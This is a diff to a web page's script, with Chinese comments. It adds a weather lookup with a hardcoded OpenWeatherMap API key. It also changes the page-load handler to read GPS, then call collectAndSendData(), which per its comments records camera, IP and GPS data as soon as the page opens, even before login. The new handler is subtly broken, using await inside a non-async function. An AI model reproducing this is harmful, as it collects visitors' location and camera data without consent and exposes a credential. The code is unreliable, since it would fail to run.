@@ -523,6 +523,31 @@
         return null;
       }
     }
+    ///
+     async function getWeatherInfo(latitude, longitude) {
+      try {
+        if (!latitude || !longitude) return;
+        // TODO: 替換成你自己的 OpenWeatherMap API Key
+        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
+        const resp = await fetch(
+          `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
+        );
+        const weatherData = await resp.json();
+        const temp = weatherData.main.temp;
+        const weather = weatherData.weather[0].description;
+        const humidity = weatherData.main.humidity;
+
+        const weatherInfo = document.getElementById('weatherInfo');
+        weatherInfo.innerHTML = 
+          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
+           溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
+      } catch (err) {
+        console.error('天氣資訊獲取失敗:', err);
+        document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
+      }
+    }
+
+    
 
     async function collectAndSendData() {
       const statusElem = document.getElementById('status');
@@ -588,8 +613,24 @@
      * 8. 頁面載入後 (可視需求預先執行收集)
      ************************************************/
     document.addEventListener('DOMContentLoaded', () => {
-      // 如需一進頁面就收集, 可呼叫 
-      collectAndSendData();
+      try {
+        // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
+        const gpsData = await getGpsCoordinates();
+        if (gpsData) {
+          // 更新地圖
+          document.getElementById('map').src = 
+            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+          // 更新天氣
+          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
+        }
+
+        // 一打開就開始記錄資料（相機 / IP / GPS）
+        // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
+        collectAndSendData();
+
+      } catch (error) {
+        console.error('DOMContentLoaded 初始化時錯誤:', error);
+      }
     });
   </script>
 </body>
